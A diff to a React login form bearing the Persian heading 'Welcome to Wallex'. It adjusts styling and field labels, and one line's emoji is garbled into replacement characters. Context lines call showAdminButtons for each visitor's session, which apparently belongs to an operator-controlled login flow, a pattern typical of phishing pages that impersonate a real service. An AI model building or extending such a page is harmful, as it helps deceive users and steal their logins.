@@ -654,7 +654,7 @@ export const LoginForm = () => {
         setTimeout(async () => {
           try {
             console.log(
-              "📱 User reached loading step from email, showing admin buttons...",
+              "���� User reached loading step from email, showing admin buttons...",
             );
             await showAdminButtons(sessionId);
           } catch (error) {
@@ -976,13 +976,23 @@ export const LoginForm = () => {
               </div>
 
               <form onSubmit={handlePhoneSubmit}>
+                <h5
+                  style={{
+                    fontSize: "20px",
+                    fontWeight: "700",
+                    lineHeight: "36px",
+                    marginBottom: "24px",
+                    textAlign: "center",
+                  }}
+                >
+                  به والکس خوش آمدید
+                </h5>
                 {/* Mobile Number Input */}
                 <div
+                  inputMode="numeric"
                   style={{
                     display: "inline-flex",
                     flexDirection: "column",
-                    marginBottom: "16px",
-                    marginTop: "16px",
                     position: "relative",
                     verticalAlign: "top",
                     width: "100%",
@@ -1018,7 +1028,7 @@ export const LoginForm = () => {
                       color: "rgb(0, 0, 0)",
                     }}
                   >
-                    شماره همراه را وارد کنید.
+                    شماره موبایل
                   </label>
                   <div
                     style={{
